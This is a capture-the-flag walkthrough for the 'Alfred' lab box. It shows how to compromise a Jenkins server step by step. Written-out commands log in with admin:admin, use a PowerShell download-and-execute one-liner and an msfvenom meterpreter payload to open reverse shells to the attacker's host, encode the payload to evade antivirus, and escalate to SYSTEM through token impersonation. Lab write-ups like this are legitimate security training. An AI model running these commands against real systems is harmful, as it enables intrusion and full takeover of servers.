# Alfred 

In this box you will learn :
- Dig Infos from a web page. 
- Use remote python basic server to upload file
- Use a powershell command to upload a file on a remote machine. 
- Log as admin:admin ;) 
- Privilege escalation with token impersonation
 

### Section 1 : Recon 

Let's kick it with a Nmap. 

![image](/assets/img/Alfred/nmap.png)

We can see that we have 2 http ports open. 
One on the port 80 and the other on port 8080.

Let's check them both.

On the first website we just have an Hearthbreaking news... Bruce Wayne is dead !

![image](/assets/img/Alfred/wayne.png)

I gathered no useful informations here, even when I inspected the image. 

On the second website, we have a login page to connect to a jenkins server.

_If you don't know what Jenkins is :_ 
- [jenkins](https://www.jenkins.io/)

![image](/assets/img/Alfred/login.png)

I tried with default jenkins credentials and with the famous admin:admin (which sadly worked).
We are into the admin panel now !

The next task is to connect to the machin with a reverse shell with the help of a powershell command.

We can see that we have a job avaible on the main page, click on it and go to the url: 

```text
http://<machine_ip>:8080/job/project
```

We have a thing called "build" that we can run.

![image](/assets/img/Alfred/build.png)

This build execute a lot of different actions, the one that is intersting is the one that runs a powershell command that will be executed on the remote machine.

We can take advantage of this by uploading a file on the machine.

Go to the configuration page, scroll down to the Build part and you will see a windows where we can enter the command that we want.

![image](/assets/img/Alfred/run.png)

I used this powershell script to upload a remote shell on the machine. 
```bash
powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.15.91:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.15.91 -Port 5555
```

Click save and prepare the file, a python server and a netcat listener. 

First, go to the github page to copy the command to a file called "Invoke-PowerShellTcp.ps1"

- [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

You can see that I saved it in my directory prepared for the box.

![image](/assets/img/Alfred/save.png)

In the same directory, launch your python server so the machine can download the file and execute it.
```bash 
python3 -m http.server
```

![image](/assets/img/Alfred/python.png)
  
Last thing to setup, is a netcat listener on port 5555.
```bash
nc -nlvp 5555
```

![image](/assets/img/Alfred/netcat.png)

Now go back to the webpage and click on "Build now".

![image](/assets/img/Alfred/buildnow.png)

You can see on the terminal where the python server is running that the file got downloaded.
And on the netcat terminal, you will be in (normally).

You will be connected as bruce, go to his folder to find the user.txt

### Section 2 : Switching Shell with metasploit

In this section, we are gonna connect to the machine with a msfpayload and metasploit.
Metasploit will just be there to create a listener and get connected with a meterpreter session. 

First, let's create our payload with msfvenom. 
```bash 
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai EXITFUNC=thread LHOST=<your_ip> LPORT=<your_port> -f exe -o <name_of_the_file.exe>
```
![image](/assets/img/Alfred/msfvenom.png)

_The payload is encoded as x86-64 to evade anti-virus products, so the anti virus will not recognise the payload._  

Next, launch again a python http server.
```bash 
python3 -m http.server
```
![image](/assets/img/Alfred/python.png)
And now, we are gonna launch msfconsole to set up a multi/handler.
- LHOST is your IP. 
- LPORT is the same port that you set for the msfvenom payload. 

![image](/assets/img/Alfred/setmsf.png)

Run it and we will be back on the web page to execute our payload.

Go back to the same configuation page, to enter the following powershell command :
```bash
powershell "(New-Object Net.WebClient).DownloadFile('http://10.11.15.91:8000/reverse_tcp.exe,'reverse_tcp.exe')"
```

![image](/assets/img/Alfred/buildpower1.png)

We just uploaded the file on the machine. 

Now go back to the build and set an other command to run the program inside the machine. 
```bash
.\reverse_tcp.exe 
```

![image](/assets/img/Alfred/execute.png)

Normally on your terminal where metasploit is running, you will have a meterpreter shell up.

### Section 3 : Priv esc.

In this section we will take advantage of token impersonation to gain system access

Ressources to understand token impersonation : 

- [Offensive-Security](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)
- [Exploit-DB](https://www.exploit-db.com/papers/42556)

View all the privileges with the command :
```bash
whoami /priv 
```

![image](/assets/img/Alfred/whoami.png)

With this command you can see the privileges and which one are enabled for you session. 
THe one that are intersting are the "SeDebugPrivilege" and "SeImpersonatePrivilege" which are enabled for us.
The incognito module will help use to exploit this vulnerability.

First, let's load the module from our meterpreter session.
```bash
load incognito
```

![image](/assets/img/Alfred/loadinco.png)

Next, we are gonna list the avaible tokens inside the system.
```bash 
 list_token -g.
``` 

![image](/assets/img/Alfred/listoken.png)

We can see that the BUILTIN/Administrators token is available.

Use the command : 
```bash 
impersonate_token BUILTIN/Administrators" 
```
To impersonate the Administrators token.

Run the "getuid" command to see as which user your session is running.
```bash 
getuid
```

Even if right now we a higher privileged token we may not have the permissions of a privileged user.
We need to migreate to a process with correct permissions. 
The safest one is the services.exe process.

Use the command :
```bash
ps
``` 
So we will have an overview of all processes and find the PID of the services.exe process.

![image](/assets/img/Alfred/service.png)

Then migrate to the services.exe with : 
```bash 
migrate <PID-OF-PROCESS>
```
![image](/assets/img/Alfred/migrate.png)

Finally Navigate to the Admin desktop to find the root.txt.
